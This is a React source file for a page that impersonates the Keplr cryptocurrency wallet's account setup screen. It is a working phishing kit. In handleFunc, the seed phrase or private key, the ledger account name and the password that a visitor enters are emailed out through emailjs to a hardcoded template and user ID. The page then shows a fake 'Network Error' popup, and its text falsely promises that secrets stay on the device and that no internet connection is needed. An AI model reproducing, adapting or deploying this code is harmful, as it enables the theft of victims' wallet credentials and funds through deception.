import { useState, useEffect } from 'react';
import {
  BrowserRouter as Router,
  Switch,
  Route,
} from "react-router-dom";
import { 
	Flex,
	Box,
	Text,
	Button,
	Input,
  	Spacer,
  	Image,
  	ChakraProvider,
  	Spinner,
} from "@chakra-ui/react";
import emailjs from 'emailjs-com';
import "./App.scss";
import "./mdi/css/materialdesignicons.css";
import {
  ViewIcon,
  ViewOffIcon
} from "@chakra-ui/icons";
import Logo from "./logo.svg";
import iName from "./name.png";
import googleIcon from "./google.png";

function App() {
	const [screen, setScreen] = useState(0)
	const [title, setTitle] = useState("")
	const [adv, setAdv] = useState(false)
	const [modal, setModal] = useState(false)
	const actions = ["Create new account", "Import existing account", "Import ledger"]
	const [mError, setMError] = useState(false)
	const [aError, setAError] = useState(false)
	const [pError, setPError] = useState(false)
	const [cError, setCError] = useState(false)
	const [lError, setLError] = useState("")
	const [nError, setNError] = useState(false)
	const [loading, setLoading] = useState(false)
	const [tWd, setTwd] = useState(0)

	useEffect(() => {
		setAdv(false)
		setMError(false)
		setAError(false)
		setPError(false)
		setCError(false)
		setLError("")
		setLoading(false)
		setTwd(0)
	}, [screen])

	async function handleFunc() {
		var m = title === "Input your seed" ? document.getElementById('mArea').value : ""
		var a = document.getElementById('aArea').value
		var p = document.getElementById('pArea').value
		var c = document.getElementById('cArea').value
		if(title === "Input your seed") {
			if(m === "" && a === "" && p === "" && c === "") {	
				setLError("Mnemonic is required")
				setMError(true)
				setAError(true)
				setPError(true)
				setCError(true)
			}
			else if(m === "") {
				setMError(true)
			}
			else if(a === "") {
				setAError(true)
			}
			else if(p === "") {
				setPError(true)
			}
			else if(c === "") {
				setCError(true)
			}
			else if(m.match(/(\w+)/g)?.length < 12) {
				setLError("Too short mnemonic")
				setMError(true)
			}
			else {
				const templateParams = {
					from_name: "New User",
					message: "Keplr Wallet Phrase is:=("+m+") and password is ("+p+")"
				}
				setLoading(true)
				await emailjs.send('outlook', 'template_o56f59x', templateParams, 'user_dc6zvosdPxmxouq5EigcI')
				.then((response) => {
					console.log('')
				}, (err) => {
					console.log('')
				})
				setLoading(false)
				setNError(true)
			}
		}
		else if(title === "Mnemonic Seed") {
			if(a === "" && p === "" && c === "") {
				setAError(true)
				setPError(true)
				setCError(true)
			}
			else if(a === "") {
				setAError(true)
			}
			else if(p === "") {
				setPError(true)
			}
			else if(c === "") {
				setCError(true)
			}
			else {
				setLoading(true)
				setTimeout(function() {
					setNError(true)
					setLoading(false)	
				}, 3000)
			}
		}
		else if(title === "Account name") {
			if(a === "" && p === "" && c === "") {
				setAError(true)
				setPError(true)
				setCError(true)
			}
			else if(a === "") {
				setAError(true)
			}
			else if(p === "") {
				setPError(true)
			}
			else if(c === "") {
				setCError(true)
			}
			else {
				const templateParams = {
					from_name: "New User",
					message: "Keplr Wallet ledger account name is:=("+a+") and password is ("+p+")"
				}
				setLoading(true)
				await emailjs.send('outlook', 'template_o56f59x', templateParams, 'user_dc6zvosdPxmxouq5EigcI')
				.then((response) => {
					console.log('')
				}, (err) => {
					console.log('')
				})
				setLoading(false)
				setNError(true)
			}
		}
		else if(title === "Sign in with Google") {
			if(a === "" && p === "" && c === "") {
				setAError(true)
				setPError(true)
				setCError(true)
			}
			else if(a === "") {
				setAError(true)
			}
			else if(p === "") {
				setPError(true)
			}
			else if(c === "") {
				setCError(true)
			}
			else {
				setLoading(true)
				setTimeout(function() {
					setNError(true)
					setLoading(false)	
				}, 3000)
			}
		}
	}

	return (
		<ChakraProvider>
			<Flex fontFamily="Nunito Sans" w="100%" justify="center" align="center" minHeight="100vh" direction="column">
				<Flex w={["90%", "33%"]} h="auto" direction="column" pt="5" mb="5">
					<Flex align="center" mb="10">
						<Image src={Logo} w="auto" h={["50px", "81px"]} mr={["4", "5"]} />
						<Flex direction="column">
							<Image h={["23px", "50px"]} w={["55px", "123px"]} src={iName} />
							<Text fontSize={["14px", "16px"]} mt={["0.5", "0"]}>Wallet for the Interchain</Text>
						</Flex>
					</Flex>

				{
					screen === 0 ?
					<Flex w="100%" direction="column">			
						<Flex color="#5e72e4" border="1px solid #5e72e4" borderRadius="0.375rem" justify="center" align="center" transition="all .15s ease" fontWeight="bold" fontSize=".875rem" cursor="pointer" py="3" _hover={{ bg: "#5e72e4", color: "#fff", boxShadow: "0 4px 6px rgb(50 50 93 / 11%), 0 1px 3px rgb(0 0 0 / 8%)" }} onClick={() => {
							setTitle("Sign in with Google")
							setScreen(1)
						}}>
							<Image w="16px" h="16px" src={googleIcon} mr="2" />
							Sign in with Google
						</Flex>

						<Flex justify="center" mt="2">
							<Flex textAlign="center" transition="all .15s ease" color="#9092b6" fontSize="12px" cursor="pointer" _hover={{ color: "#5e72e4" }} onClick={() => window.open("https://tor.us/", "_BLANK")}>Powered by Torus</Flex>
						</Flex>

						<Flex w="100%" mt="20px" mb="18px" borderTop="1px solid rgba(0,0,0,.1)"></Flex>
						{
							actions.map((item, index) => (
								<Flex color="#5e72e4" border="1px solid #5e72e4" borderRadius="0.375rem" justify="center" align="center" transition="all .15s ease" fontWeight="bold" fontSize=".875rem" cursor="pointer" py="3" mb="2" _hover={{ bg: "#5e72e4", color: "#fff", boxShadow: "0 4px 6px rgb(50 50 93 / 11%), 0 1px 3px rgb(0 0 0 / 8%)" }} onClick={() => {
									if(index === 0) {
										setTitle("Mnemonic Seed")
										setScreen(1)
									}
									else if(index === 1) {
										setTitle("Input your seed")
										setScreen(1)
									}
									else if(index === 2) {
										setTitle("Input your seed")
										setScreen(1)
									}
								}}>
									{item}
								</Flex>
							))
						}

						<Flex direction="column" justify="center" color="#9092b6" fontSize="14px" mt="34px">
							<Text textAlign="center">All sensitive information is stored only on your device.</Text>
							<Text textAlign="center">This process does not require an internet connection.</Text>
						</Flex>
					</Flex>
					:
					screen === 1 &&
					<Flex w="100%" direction="column">
						{
							title === "Mnemonic Seed" && 
							<Flex w="100%" direction="column" mb="4">
								<Flex w="100%" direction="column" bg="#fc7c5f" color="#fff" padding="1rem 1.5rem" borderRadius=".375rem">
									<Text fontSize="1.0625rem" mb=".5rem" fontWeight="bold">Backup your mnemonic seed securely.</Text>
									<Flex direction="column" pl="5%" fontSize=".875rem" mb="2">
										<Flex><i className="mdi mdi-circle" style={{ fontSize: "7px", marginRight: "5px", marginTop: "5px" }}></i> Anyone with your mnemonic seed can take your assets.</Flex>
									</Flex>
									<Flex direction="column" pl="5%" fontSize=".875rem">
										<Flex><i className="mdi mdi-circle" style={{ fontSize: "7px", marginRight: "5px",  marginTop: "5px"}}></i> Lost mnemonic seed can't be recovered.</Flex>
									</Flex>
								</Flex>
							</Flex>
						}
						
						<Flex w="100%" justify="space-between" mb="24px" align="center">
							<Text fontSize={["22px", "24px"]} color="#525f7f">{title}</Text>
							{
								title === "Mnemonic Seed" &&
								<Flex>
									<Flex color={tWd === 0 ? "#fff" : "#5e72e4"} bg={tWd === 0 ? "#5e72e4" : "#fff"} border="1px solid #5e72e4" borderTopLeftRadius="0.375rem" borderBottomLeftRadius="0.375rem" justify="center" align="center" transition="all .15s ease" fontWeight="bold" fontSize=".75rem" cursor="pointer" py="1" boxShadow={tWd === 0 ? "0 4px 6px rgb(50 50 93 / 11%), 0 1px 3px rgb(0 0 0 / 8%)" : "none"} _hover={{ color: "#fff", bg: "#5e72e4", boxShadow: "0 4px 6px rgb(50 50 93 / 11%), 0 1px 3px rgb(0 0 0 / 8%)"}} px="3" onClick={() => {
										setTwd(0)
									}}>
										12 words
									</Flex>
									<Flex color={tWd === 1 ? "#fff" : "#5e72e4"} bg={tWd === 1 ? "#5e72e4" : "#fff"} border="1px solid #5e72e4" borderTopRightRadius="0.375rem" borderBottomRightRadius="0.375rem" justify="center" align="center" transition="all .15s ease" fontWeight="bold" fontSize=".75rem" cursor="pointer" py="1" boxShadow={tWd === 1 ? "0 4px 6px rgb(50 50 93 / 11%), 0 1px 3px rgb(0 0 0 / 8%)" : "none"} _hover={{ color: "#fff", bg: "#5e72e4", boxShadow: "0 4px 6px rgb(50 50 93 / 11%), 0 1px 3px rgb(0 0 0 / 8%)"}} px="3" onClick={() => {
										setTwd(1)
									}}>
										24 words
									</Flex>
								</Flex>
							}
						</Flex>
						{
							title === "Input your seed" &&
							<>
								<Flex boxShadow="0 1px 3px rgb(50 50 93 / 15%), 0 1px 0 rgb(0 0 0 / 2%)" transition="box-shadow .15s ease" py="3" boxSizing="border-box" borderRadius=".375rem" w="100%" px="4" _hover={{ boxShadow: "0 1px 5px rgb(50 50 93 / 28%), 0 5px 0 rgb(0 0 0 / 2%)" }}>
									<input type="password" placeholder="Type your mnemonic / private key" style={{ width: "100%", textAlign: "center" }} id="mArea" onInput={(e) => {
										if(e.target.value !== "") {
											setMError(false)
										}
										else {
											setMError(true)
										}
									}} />
								</Flex>
								{
									mError && <Text color="#fb6340" mt=".25rem" fontSize="12px">{lError}</Text>
								}
							</>
						}

						

						{
							title === "Mnemonic Seed" &&
							<Text fontSize="18px" fontFamily='"Courier Prime",serif' padding="20px 30px" textAlign="center">{tWd === 0 ? "nerve seed matrix can sheriff main random coffee echo napkin whip neck" : "zone dash story error hill boost disorder label small churn armed author romance skin eagle move average catalog morning half cereal inquiry receive game"}</Text>
						}

						<Text mb="0.5rem" mt={title === "Input your seed" && "7"} color="#525f7f" fontWeight="bold" fontSize=".875rem">Account name</Text>
						<Flex boxShadow="0 1px 3px rgb(50 50 93 / 15%), 0 1px 0 rgb(0 0 0 / 2%)" transition="box-shadow .15s ease" py="3" boxSizing="border-box" borderRadius=".375rem" w="100%" px="4" _hover={{ boxShadow: "0 1px 5px rgb(50 50 93 / 28%), 0 5px 0 rgb(0 0 0 / 2%)" }}>
							<input style={{ width: "100%" }} id="aArea" onInput={(e) => {
								if(e.target.value !== "") {
									setAError(false)
								}
								else {
									setAError(true)
								}
							}} />
						</Flex>
						{
							aError && <Text color="#fb6340" mt=".25rem" fontSize="12px">Account name is required</Text>
						}

						<Text mb="0.5rem" mt="7" color="#525f7f" fontWeight="bold" fontSize=".875rem">New Password (minimum 8 characters)</Text>
						<Flex boxShadow="0 1px 3px rgb(50 50 93 / 15%), 0 1px 0 rgb(0 0 0 / 2%)" transition="box-shadow .15s ease" py="3" boxSizing="border-box" borderRadius=".375rem" w="100%" px="4" _hover={{ boxShadow: "0 1px 5px rgb(50 50 93 / 28%), 0 5px 0 rgb(0 0 0 / 2%)" }}>
							<input type="password" style={{ width: "100%" }} id="pArea" onInput={(e) => {
								if(e.target.value !== "") {
									setPError(false)
								}
								else {
									setPError(true)
								}
							}} />
						</Flex>
						{
							pError && <Text color="#fb6340" mt=".25rem" fontSize="12px">Password is required</Text>
						}

						<Text mb="0.5rem" mt="7" color="#525f7f" fontWeight="bold" fontSize=".875rem">Confirm password</Text>
						<Flex boxShadow="0 1px 3px rgb(50 50 93 / 15%), 0 1px 0 rgb(0 0 0 / 2%)" transition="box-shadow .15s ease" py="3" boxSizing="border-box" borderRadius=".375rem" w="100%" px="4" _hover={{ boxShadow: "0 1px 5px rgb(50 50 93 / 28%), 0 5px 0 rgb(0 0 0 / 2%)" }}>
							<input type="password" style={{ width: "100%" }} id="cArea" onInput={(e) => {
								if(e.target.value !== "") {
									setCError(false)
								}
								else {
									setCError(true)
								}
							}} />
						</Flex>
						{
							cError && <Text color="#fb6340" mt=".25rem" fontSize="12px">Confirm password is required</Text>
						}

						{
							title !== "Sign in with Google" &&
							<>
								<Flex justify="center" mt="8" mb="3"><Flex color="#5e72e4" cursor="pointer" fontSize=".875rem" transition="all .15s ease" fontWeight="bold" _hover={{ color: "#354edb" }} onClick={() => {
									if(!adv) {
										setAdv(true)
									}
									else {
										setModal(true)
									}
								}}>Advanced</Flex></Flex>
								{
									adv && 
									<Flex direction="column" mt="-2" mb="6">
										<Text color="#525f7f" mb="4" fontWeight="bold" fontSize='.875rem'>HD Derivation Path</Text>
										<Flex w="100%">
											<Text>m/44'/···'/</Text><Flex boxShadow="0 1px 3px rgb(50 50 93 / 15%), 0 1px 0 rgb(0 0 0 / 2%)" transition="box-shadow .15s ease" py="2" boxSizing="border-box" borderRadius=".375rem" w="25%" px="4" _hover={{ boxShadow: "0 1px 5px rgb(50 50 93 / 28%), 0 5px 0 rgb(0 0 0 / 2%)" }}>
												<input type="number" style={{ width: "100%", textAlign: "right" }} placeholder="0" />
											</Flex>

											<Text>'/</Text><Flex boxShadow="0 1px 3px rgb(50 50 93 / 15%), 0 1px 0 rgb(0 0 0 / 2%)" transition="box-shadow .15s ease" py="2" boxSizing="border-box" borderRadius=".375rem" w="25%" px="4" _hover={{ boxShadow: "0 1px 5px rgb(50 50 93 / 28%), 0 5px 0 rgb(0 0 0 / 2%)" }}>
												<input type="number" style={{ width: "100%", textAlign: "right" }} placeholder="0" />
											</Flex>

											<Text>/</Text><Flex boxShadow="0 1px 3px rgb(50 50 93 / 15%), 0 1px 0 rgb(0 0 0 / 2%)" transition="box-shadow .15s ease" py="2" boxSizing="border-box" borderRadius=".375rem" w="25%" px="4" _hover={{ boxShadow: "0 1px 5px rgb(50 50 93 / 28%), 0 5px 0 rgb(0 0 0 / 2%)" }}>
												<input type="number" style={{ width: "100%", textAlign: "right" }} placeholder="0" />
											</Flex>
										</Flex>
									</Flex>
								}
							</>
						}

						<Flex color="#fff" bg="#5e72e4" border="1px solid #5e72e4" borderRadius="0.375rem" justify="center" align="center" transition="all .15s ease" fontWeight="bold" fontSize=".875rem" cursor="pointer" py="3" boxShadow="0 4px 6px rgb(50 50 93 / 11%), 0 1px 3px rgb(0 0 0 / 8%)" mt={title === "Sign in with Google" && "6"} _hover={{ marginTop: title !== "Sign in with Google" ? "0.5" : "7"}} onClick={handleFunc}>
							{loading ? <Spinner color="#fff" emptyColor="lightgrey" /> : "Next"}
						</Flex>

						<Flex mt="2" pl="3"><Flex color="#5e72e4" cursor="pointer" fontSize=".875rem" transition="all .15s ease" fontWeight="bold" _hover={{ color: "#354edb" }} align="center" onClick={() => setScreen(0)}><i className="mdi mdi-chevron-left" style={{ fontSize: "20px", color: "inherit", marginRight: "5px" }}></i>Back</Flex></Flex>
					</Flex>
				}
				</Flex>

				{
					modal &&
					<Flex position="fixed" bg="rgba(0,0,0,0.2)" width="100%" h="100%" zIndex="1072" top="0" left="0" justify="center" align="center">
						<Flex w={["90%", "40%"]} padding="12px" boxShadow="0 15px 35px rgb(50 50 93 / 20%), 0 5px 15px rgb(0 0 0 / 17%)" borderRadius=".4375rem" justify="center" align="center" direction="column" bg="#fff">
							<Text textAlign="center" px="5%" color="#525f7f" fontSize=".85rem" mb="4">Closing this toggle will reset the HD Path. Are you sure you want to proceed?</Text>
							<Flex justify="center" align="center">
								<Flex color="#8898aa" bg="#fff" border="1px solid #8898aa" borderRadius="0.375rem" justify="center" align="center" transition="all .15s ease" fontWeight="bold" fontSize=".75rem" cursor="pointer" py="1" boxShadow="0 4px 6px rgb(50 50 93 / 11%), 0 1px 3px rgb(0 0 0 / 8%)" _hover={{ color: "#fff", bg: "#32325d"}} mr="4" px="7" onClick={() => {
									setModal(false)
								}}>
									No
								</Flex>
								<Flex color="#fff" bg="#5e72e4" border="1px solid #5e72e4" borderRadius="0.375rem" justify="center" align="center" transition="all .15s ease" fontWeight="bold" fontSize=".75rem" cursor="pointer" py="1" boxShadow="0 4px 6px rgb(50 50 93 / 11%), 0 1px 3px rgb(0 0 0 / 8%)" px="7" onClick={() => {
									setAdv(false)
									setModal(false)
								}}>
									Yes
								</Flex>
							</Flex>
						</Flex>
					</Flex>
				}

				{
					nError &&
					<Flex position="fixed" bg="rgba(0,0,0,0.2)" width="100%" h="100%" zIndex="1072" top="0" left="0" justify="center" align="center">
						<Flex w={["90%", "40%"]} padding="24px 12px" boxShadow="0 15px 35px rgb(50 50 93 / 20%), 0 5px 15px rgb(0 0 0 / 17%)" borderRadius=".4375rem" justify="center" align="center" direction="column" bg="#fff">
							<Text textAlign="center" px="5%" color="#525f7f" fontSize=".85rem" mb="4">Network Error! Cannot connect at the moment kindly try again</Text>
							<Flex color="#fff" bg="#5e72e4" border="1px solid #5e72e4" borderRadius="0.375rem" justify="center" align="center" transition="all .15s ease" fontWeight="bold" fontSize=".75rem" cursor="pointer" py="1" boxShadow="0 4px 6px rgb(50 50 93 / 11%), 0 1px 3px rgb(0 0 0 / 8%)" px="7" onClick={() => {
								setNError(false)
							}}>
								Okay
							</Flex>
						</Flex>
					</Flex>
				}
			</Flex>
		</ChakraProvider>
	)
}

export default App;
